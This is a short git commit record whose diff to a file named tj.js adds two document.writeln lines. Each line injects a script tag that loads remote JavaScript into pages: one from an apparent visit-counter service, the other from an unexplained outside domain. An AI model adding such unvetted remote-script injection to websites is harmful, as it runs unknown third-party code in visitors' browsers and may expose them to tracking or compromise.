aa8b7006113c68692622ad9f4c6b46e49183ae85
js999999999 <js-9@outlook.com>
2017-02-14 15:58:14 +0800

    Update tj.js

--- cjs/tj.js
+++ cjs/tj.js
@@ -1,1 +1,3 @@
-1
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count28.51yes.com\/click.aspx?id=280954514&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/cjs/t.js ><\/script>");
